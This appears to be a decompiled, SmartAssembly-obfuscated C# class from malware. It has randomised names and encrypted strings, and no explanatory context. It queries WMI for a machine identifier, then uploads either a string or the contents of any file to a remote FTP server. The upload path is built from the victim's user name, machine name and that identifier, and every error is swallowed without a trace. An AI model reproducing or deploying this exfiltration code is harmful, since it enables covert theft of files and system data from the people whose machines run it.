using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bfaErnBXmrcm;

internal sealed class wMwNYqMekmsi
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string XMWRKNxZLd()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_00a1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass(getString_0(107370480));
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = instances.GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107370491)).get_Value()
						.ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = getString_0(107370442);
			ManagementObject val3 = new ManagementObject(getString_0(107370469) + text + getString_0(107370428));
			val3.Get();
			return ((ManagementBaseObject)val3).get_Item(getString_0(107370423)).ToString();
		}
		catch (Exception)
		{
			return getString_0(107361189);
		}
	}

	public static void OlcIaMBgXfI(string rBYlXgWUlNoFNDuO = "URL", string rtkRmEClNWWrQqc = "USERNAME", string QSlIZHCGLPr = "ACCESO", string NsBwvomhDXfH = "")
	{
		try
		{
			string text = XMWRKNxZLd();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(rBYlXgWUlNoFNDuO + getString_0(107374145) + Environment.UserName + getString_0(107374100) + Environment.MachineName + getString_0(107374111) + text + getString_0(107374106));
			ftpWebRequest.Method = getString_0(107369886);
			ftpWebRequest.Credentials = new NetworkCredential(rtkRmEClNWWrQqc, QSlIZHCGLPr);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(NsBwvomhDXfH);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void DiSLDKhsEspLxK(string oKYhWWIbLUHzxbYF = "URL", string CQtbNInEtWmbfiI = "USERNAME", string BTpnSDAZCfxK = "ACCESO", string uDRgxsJvDeZuS = "")
	{
		try
		{
			string text = XMWRKNxZLd();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(oKYhWWIbLUHzxbYF + getString_0(107374145) + Environment.UserName + getString_0(107374100) + Environment.MachineName + getString_0(107374111) + text + getString_0(107374111) + Path.GetFileName(uDRgxsJvDeZuS));
			ftpWebRequest.Method = getString_0(107369886);
			ftpWebRequest.Credentials = new NetworkCredential(CQtbNInEtWmbfiI, BTpnSDAZCfxK);
			byte[] array = File.ReadAllBytes(uDRgxsJvDeZuS);
			ftpWebRequest.ContentLength = array.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(array, 0, array.Length);
		}
		catch
		{
		}
	}

	static wMwNYqMekmsi()
	{
		Strings.CreateGetStringDelegate(typeof(wMwNYqMekmsi));
	}
}
